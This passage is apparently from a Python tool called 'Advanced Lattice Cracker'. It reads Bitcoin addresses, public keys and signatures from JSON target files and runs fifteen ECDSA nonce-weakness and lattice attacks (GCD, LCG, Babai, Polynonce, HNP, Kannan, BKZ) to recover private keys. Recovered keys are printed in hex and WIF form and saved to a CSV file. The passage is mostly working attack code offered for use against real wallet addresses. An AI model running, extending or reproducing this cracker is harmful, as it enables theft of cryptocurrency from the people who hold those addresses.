    sigs = sigs[:MAX_SIGS]

    # Normalize s values (Bitcoin low-s rule)
    sigs = normalize_s(sigs)

    print(f"\n{'=' * 70}", flush=True)
    print(f"[*] Target: {address}", flush=True)
    print(f"[*] Pubkey: {pub[:20]}...  |  Signatures: {len(sigs)}", flush=True)

    target_t0 = time.time()
    target_deadline = target_t0 + 720  # 12 minutes max per target
    result = None  # Will hold recovery dict if successful

    # Precompute uv once for GCD/LCG
    precomputed_uv_list = precompute_uv(sigs)

    # Helper to run and print (real-time output like original tool)
    def try_attack(label, func, *args):
        nonlocal result
        if result is not None:
            return  # Already cracked
            
        if time.time() > target_deadline:
            print(f"  -> {label}... SKIPPED (Target deadline exceeded)", flush=True)
            return

        d, elapsed, err = run_attack(label, func, *args)
        if err:
            print(f"  -> {label}... ERROR ({elapsed:.1f}s)", flush=True)
        elif d:
            print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
            result = {"address": address, "pub": pub, "priv": hex(d),
                      "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
                      "bug": label}
        else:
            print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
        gc.collect()

    # ════════════════ PHASE 0: INSTANT ════════════════════════════════
    print(f"\n[PHASE 0] Instant Attacks (No Lattice)...", flush=True)
    try_attack(f"GCD Small-Delta ({len(sigs)} sigs)", solve_gcd_nonce, pub, sigs, 500, precomputed_uv_list)
    try_attack(f"LCG Phantom ({len(sigs)} sigs)", solve_lcg_phantom, pub, sigs, precomputed_uv_list)

    # ════════════════ PHASE 1: FAST ═══════════════════════════════════
    if result is None:
        print(f"\n[PHASE 1] Fast (Babai CVP + MC + SLA + Polynonce)...", flush=True)

        for bits in [32, 16, 8, 6]:
            if result is not None:
                break
            req = min_sigs_lll(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            try_attack(f"Babai MSB {bits}-bit ({use} sigs)", solve_babai_msb, pub, sigs[:use], bits)
            try_attack(f"Babai LSB {bits}-bit ({use} sigs)", solve_babai_lsb, pub, sigs[:use], bits)

    # Polynonce (Dario Clavijo Differential)
    if result is None and len(sigs) >= 4:
        poly_configs = [
            (249, 79), (240, 60), (200, 50), (160, 40), (128, 30), (100, 20), (64, 15)
        ]
        for bb, req in poly_configs:
            if result is not None:
                break
            if len(sigs) < req:
                continue
            try_attack(f"Polynonce {bb}-bit ({req} sigs)", solve_polynonce, pub, sigs[:req], bb)

    # Monte Carlo — adaptive trials: scale by sig count, 30s time budget
    if result is None and len(sigs) >= 15:
        nsigs = len(sigs)
        # More sigs → fewer trials needed (easier to find a good subset)
        # Fewer sigs → fewer trials too (fewer unique subsets exist)
        mc_configs = [
            (32, min(nsigs, 15), min(60, max(10, nsigs))),
            (16, min(nsigs, 26), min(40, max(8, nsigs // 2))),
        ]
        for bits, ss, trials in mc_configs:
            if result is not None:
                break
            if nsigs < ss:
                continue
            try_attack(f"Monte Carlo {bits}-bit ({trials}x{ss})", solve_monte_carlo, pub, sigs, bits, trials, ss, 30)

    # SLA — adaptive iterations, 30s time budget
    if result is None and len(sigs) >= 15:
        nsigs = len(sigs)
        sla_configs = [
            (32, min(nsigs, 15), min(40, max(8, nsigs))),
            (16, min(nsigs, 26), min(30, max(6, nsigs // 2))),
        ]
        for bits, ss, iters in sla_configs:
            if result is not None:
                break
            if nsigs < ss:
                continue
            try_attack(f"SLA {bits}-bit ({iters}x{ss})", solve_sla, pub, sigs, bits, iters, ss, 30)

    # Filtered Lattice
    if result is None and len(sigs) >= 5:
        for bits in [16, 8]:
            if result is not None:
                break
            try_attack(f"Filtered Lattice {bits}-bit ({len(sigs)} sigs)", solve_filtered_lattice, pub, sigs, bits)

    # ════════════════ PHASE 2: STANDARD HNP ═══════════════════════════
    if result is None:
        print(f"\n[PHASE 2] Standard HNP Attacks...", flush=True)

        for w, s in [(32, 112), (32, 96), (16, 120)]:
            if result is not None:
                break
            req = min_sigs_lll(w)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            try_attack(f"Middle-Bit w{w}@{s} ({use} sigs)", solve_middle_bits, pub, sigs[:use], w, s)

    if result is None:
        for bias, req_s in [(64, 20), (48, 15)]:
            if result is not None:
                break
            if len(sigs) < req_s:
                continue
            try_attack(f"Linear Bias {bias}-bit ({req_s} sigs)", solve_linear_nonce, pub, sigs[:req_s], bias)

    if result is None:
        for shared, req_s in [(32, 15), (64, 10)]:
            if result is not None:
                break
            if len(sigs) < req_s:
                continue
            try_attack(f"Shared LSB {shared}-bit ({req_s} sigs)", solve_shared_lsb, pub, sigs[:req_s], shared)

    if result is None:
        for err, req_s in [(32, 18), (64, 12)]:
            if result is not None:
                break
            if len(sigs) < req_s:
                continue
            try_attack(f"Sequential {err}-bit ({req_s} sigs)", solve_sequential_nonce, pub, sigs[:req_s], err)

    # ════════════════ PHASE 3: DEEP REDUCTION ═════════════════════════
    if result is None:
        print(f"\n[PHASE 3] Deep Reduction (Kannan + BKZ + RoundOff)...", flush=True)

        for bits in [8, 6]:
            if result is not None:
                break
            req = min_sigs_bkz(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            try_attack(f"Kannan Embedding {bits}-bit ({use} sigs)", solve_kannan_embedding, pub, sigs[:use], bits, True)

    if result is None:
        for bits in [8, 6]:
            if result is not None:
                break
            req = min_sigs_bkz(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            try_attack(f"Progressive-BKZ MSB {bits}-bit ({use} sigs)", solve_progressive_msb, pub, sigs[:use], bits)
            try_attack(f"Progressive-BKZ LSB {bits}-bit ({use} sigs)", solve_progressive_lsb, pub, sigs[:use], bits)



    # ════════════════ RESULT ═══════════════════════════════════════════
    total_elapsed = time.time() - target_t0
    if result:
        print(f"\n{'!' * 70}", flush=True)
        print(f"   [SUCCESS] CRACKED in {total_elapsed:.1f}s!", flush=True)
        print(f"   METHOD:  {result['bug']}", flush=True)
        print(f"   ADDRESS: {address}", flush=True)
        print(f"   KEY:     {result['priv']}", flush=True)
        print(f"   WIF:     {result.get('priv_wif', 'N/A')}", flush=True)
        print(f"{'!' * 70}", flush=True)

        import csv
        out_csv = os.path.join(_SCRIPT_DIR, "ADVANCED_RECOVERED_KEYS.csv")
        file_exists = os.path.isfile(out_csv)
        try:
            with open(out_csv, "a", newline="") as f:
                w = csv.writer(f)
                if not file_exists:
                    w.writerow(["Address", "Public Key", "Private Key Hex", "Private Key WIF", "Attack Method"])
                w.writerow([result['address'], result['pub'], result['priv'], result.get('priv_wif', ''), result['bug']])
            print(f"   [+] Appended instantly to ADVANCED_RECOVERED_KEYS.csv", flush=True)
        except Exception as e:
            print(f"   [-] FAILED to append to CSV: {e}", flush=True)
    else:
        print(f"\n   [FAILED] All 15 attacks exhausted ({total_elapsed:.1f}s).", flush=True)
        # Move failed JSON from pass -> processed
        src = tgt.get('_source_file', '')
        if src and os.path.isfile(src):
            processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
            os.makedirs(processed_dir, exist_ok=True)
            dst = os.path.join(processed_dir, os.path.basename(src))
            try:
                shutil.move(src, dst)
                print(f"   -> Moved to {dst}", flush=True)
            except Exception as e:
                print(f"   -> Failed to move: {e}", flush=True)

    return {
        "result": result,
        "address": address,
        "source_file": tgt.get('_source_file', ''),
        "success": result is not None,
    }


# ==============================================================================
# MAIN ORCHESTRATOR — MULTIPROCESSING + ALL CORES
# ==============================================================================
def main():
    total_t0 = time.time()
    # User requested to process only one address at a time sequentially
    num_workers = 1

    print("=" * 70)
    print(" ADVANCED LATTICE CRACKER v4.0 — SEQUENTIAL PROCESSING")
    print(f" 15 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
    print(f" CPU Cores Detected: {cpu_count() or '?'} | Using: {num_workers}")
    print("=" * 70)

    targets = []
    target_dir = os.path.join(_SCRIPT_DIR, "reports", "pass")

    if not os.path.isdir(target_dir):
        print(f"[!] Not found: {target_dir}")
        print("[!] Run the analyzer first.")
        return

    for fn in os.listdir(target_dir):
        if fn.endswith(".json"):
            fp = os.path.join(target_dir, fn)
            try:
                with open(fp, "r") as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        if 'address' not in data:
                            data['address'] = fn.replace('.json', '')
                        data['_source_file'] = fp
                        targets.append(data)
                    elif isinstance(data, list):
                        for item in data:
                            if isinstance(item, dict):
                                item['_source_file'] = fp
                        targets.extend(data)
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"Failed to load {fp}: {e}")
                print(f"[!] Skipping bad JSON: {fn} ({e})")

    seen = set()
    unique = []
    for t in targets:
        addr = t.get('address', '')
        if addr not in seen:
            seen.add(addr)
            unique.append(t)
    targets = unique

    if not targets:
        print("[!] No targets found!")
        return

    print(f"\n[*] Loaded {len(targets)} targets.\n")
    processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
    os.makedirs(processed_dir, exist_ok=True)

    # ── Run all targets in parallel ──────────────────────────────────────
    recovered = []
    if num_workers == 1 or len(targets) == 1:
        # Single worker mode (no subprocess overhead)
        results = [process_target(tgt) for tgt in targets]
    else:
        # Multiprocessing: one target per worker
        with Pool(processes=num_workers) as pool:
            results = pool.map(process_target, targets)

    for res in results:
        if res is None:
            continue
        if res["success"]:
            recovered.append(res["result"])

    total_elapsed = time.time() - total_t0
    print(f"\n{'=' * 70}")
    print(f"   SUMMARY: {len(recovered)} / {len(targets)} targets cracked")
    print(f"   Total time: {total_elapsed:.1f}s | Workers: {num_workers}")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
